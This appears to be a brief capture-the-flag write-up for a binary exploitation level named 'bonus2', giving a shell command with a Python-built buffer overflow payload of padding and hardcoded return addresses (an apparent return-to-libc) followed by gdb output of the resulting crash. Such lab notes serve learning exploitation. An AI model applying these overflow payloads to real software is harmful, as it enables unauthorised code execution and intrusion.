BONUS_2:
# 📚 Exploiting bonus2

## payloads
```sh
export LANG=fi
./bonus2 $(python -c 'print "A"*40') $(python -c 'print "A"*18 + "\x60\xb0\xe6\xb7"+ "BBBB"+ "\x58\xcc\xf8\xb7"')
```

Program received signal SIGSEGV, Segmentation fault.
0x08048600 in main ()
(gdb) x/s $esp+0x1c
0xbffff3bc:	 'A' <repeats 30 times>, "`\260\346\267BBBBX\314\370\267"
(gdb) x/4x $esp+0x68
0xbffff408:	0x41	0x41	0x41	0x41
(gdb) x/i $eip
=> 0x8048600 <main+215>:	add    %al,(%eax)
